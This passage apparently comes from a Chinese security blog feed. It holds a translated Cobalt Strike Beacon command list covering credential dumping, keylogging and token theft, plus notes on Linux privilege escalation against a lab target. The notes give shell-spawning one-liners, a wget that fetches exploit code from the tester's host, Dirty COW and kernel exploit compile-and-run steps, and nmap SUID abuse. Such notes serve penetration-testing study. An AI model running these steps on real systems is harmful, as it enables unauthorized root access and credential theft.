&lt;p&gt;当受害机上线以后，右击选择 Interact，就可以打开 Beacon Console&lt;br&gt;
 在 beacon 处输入 help 可以看到命令说明&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Beacon Commands&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;===============&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Command                   Description&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -------                   -----------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    argue                     进程参数欺骗&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    blockdlls                 在子进程中阻止非Microsoft的DLLs文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    browserpivot              注入受害者浏览器进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bypassuac                 绕过UAC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cancel                    取消正在进行的下载&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cd                        切换目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    checkin                   强制让被控端回连一次&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    clear                     清除beacon内部的任务队列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    connect                   通过TCP连接到Beacon&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    covertvpn                 部署Covert VPN客户端&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cp                        复制文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dcsync                    从DC中提取密码哈希&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    desktop                   远程VNC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dllinject                 反射DLL注入进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dllload                   使用LoadLibrary将DLL加载到进程中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    download                  下载文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    downloads                 列出正在进行的文件下载&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    drives                    列出目标盘符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    elevate                   尝试提权&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    execute                   在目标上执行程序(无输出)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    execute-assembly          在目标上内存中执行本地.NET程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exit                      退出beacon&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getprivs                  对当前令牌启用系统权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getsystem                 尝试获取SYSTEM权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getuid                    获取用户ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hashdump                  转储密码哈希值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    help                      帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    inject                    在特定进程中生成会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jobkill                   杀死一个后台任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jobs                      列出后台任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kerberos_ccache_use       从ccache文件中导入票据应用于此会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kerberos_ticket_purge     清除当前会话的票据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kerberos_ticket_use       从ticket文件中导入票据应用于此会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    keylogger                 键盘记录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kill                      结束进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    link                      通过命名管道连接到Beacon&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    logonpasswords            使用mimikatz转储凭据和哈希值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ls                        列出文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    make_token                创建令牌以传递凭据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mimikatz                  运行mimikatz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mkdir                     创建一个目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mode http                 使用HTTP作为通信通道&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mv                        移动文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    net                       net命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    note                      给当前目标机器备注       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    portscan                  进行端口扫描&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    powerpick                 通过Unmanaged PowerShell执行命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    powershell                通过powershell.exe执行命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    powershell-import         导入powershell脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ppid                      为生成的post-ex任务设置父PID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ps                        显示进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    psexec                    使用服务在主机上生成会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    psexec_psh                使用PowerShell在主机上生成会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    psinject                  在特定进程中执行PowerShell命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pth                       使用Mimikatz进行传递哈希&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pwd                       当前目录位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    reg                       查询注册表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rev2self                  恢复原始令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rm                        删除文件或文件夹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rportfwd                  端口转发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    run                       在目标上执行程序(返回输出)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    runas                     以另一个用户权限执行程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    runasadmin                在高权限下执行程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    runu                      在另一个PID下执行程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    screenshot                屏幕截图&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setenv                    设置环境变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    shell                     cmd执行命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    shinject                  将shellcode注入进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    shspawn                   生成进程并将shellcode注入其中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep                     设置睡眠延迟时间&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    socks                     启动SOCKS4代理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    socks stop                停止SOCKS4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    spawn                     生成一个会话 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    spawnas                   以其他用户身份生成会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    spawnto                   将可执行程序注入进程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    spawnu                    在另一个PID下生成会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ssh                       使用ssh连接远程主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ssh-key                   使用密钥连接远程主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    steal_token               从进程中窃取令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    timestomp                 将一个文件时间戳应用到另一个文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    unlink                    断开与Beacon的连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    upload                    上传文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wdigest                   使用mimikatz转储明文凭据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    winrm                     使用WinRM在主机上生成会话&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wmi                       使用WMI在主机上生成会话&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可用 help + 命令的方式查看具体命令参数说明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511164648825.png&#34; alt=&#34;image-20210511164648825&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;之前说过CS与受害机默认60s进行一次交互，为了方便实验我们可以把时间设置为0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;beacon&amp;gt;sleep 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/07/18/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</guid>
            <title>Linux提权笔记</title>
            <link>https://chungod.github.io/2021/07/18/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</link>
            <category>Linux提权笔记</category>
            <pubDate>Sun, 18 Jul 2021 14:28:41 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;linux提权笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux提权笔记&#34;&gt;#&lt;/a&gt; linux 提权笔记&lt;/h2&gt;
&lt;h4 id=&#34;利用内核漏洞提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用内核漏洞提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;利用内核漏洞提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;先开启一个可以交互的终端&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo os.system(&amp;quot;/bin/bash&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现靶机是低权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409090920475.png&#34; alt=&#34;image-20210409090920475&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看靶机内核，发现其版本为 Ubuntu 14.04.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409091109670.png&#34; alt=&#34;image-20210409091109670&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开 kali 查询可利用的 exploit，将其下载&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409091229671.png&#34; alt=&#34;image-20210409091229671&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 python 将其传递到靶机上&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -m http.server 8081&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m SimpleHTTPServer 8081&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;靶机：wget http://IP:8081/37292.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409091411379.png&#34; alt=&#34;image-20210409091411379&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 exp 进行编译执行，成功获得 root 权限&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gcc -o 37292.c 37292&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./37292&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;利用旧版本nmap提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用旧版本nmap提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;利用旧版本nmap提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409095550386.png&#34; alt=&#34;image-20210409091614007&#34;&gt;&lt;/p&gt;
&lt;p&gt;nmap 支持 “interactive.” 选项，用户能够通过该选项执行 shell 命令，通常，安全人员会使用该命令来避免他们使用 nmap 命令被记录在 history 文件中&lt;/p&gt;
&lt;p&gt;查看可利用的提权 find /-perm -u=s 2&amp;gt;/dev/null&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409095637576.png&#34; alt=&#34;image-20210409095550386&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 nmap 存在提权漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;利用nmap --interactive &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!sh	成功提权&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409091614007.png&#34; alt=&#34;image-20210409095637576&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;环境变量提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境变量提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;环境变量提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;利用普通用户找到可执行文件，进行提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409102649196.png&#34; alt=&#34;image-20210122091212588&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210409102540192.png&#34; alt=&#34;image-20210409102649196&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;脏牛提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脏牛提权&#34;&gt;#&lt;/a&gt;  &lt;code&gt;脏牛提权&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;使用 &lt;code&gt;uname -a&lt;/code&gt;  命令查看 linux 内核信息，发现在脏牛漏洞范围内，可以进行测试。&lt;/p&gt;
&lt;p&gt;(需要 root 用户存在可执行文件)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210122091212588.png&#34; alt=&#34;image-20210409102540192&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;searchsploit dirty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;searchsploit -m 40839.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210122091605012.png&#34; alt=&#34;image-20210410094828540&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 将 exp 一下载到本地，使用 gcc -pthread dirty.c -o dirty -lcrypt` 命令对 dirty.c 进行编译，生成一个 dirty 的可执行文件。&lt;/p&gt;
&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 40839.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -pthread 40839.c -o 40839 -lcrypt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./40839&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;等一会passwd文件会生成一个firefart用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su firefart (输入之前的密码,成功提权)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
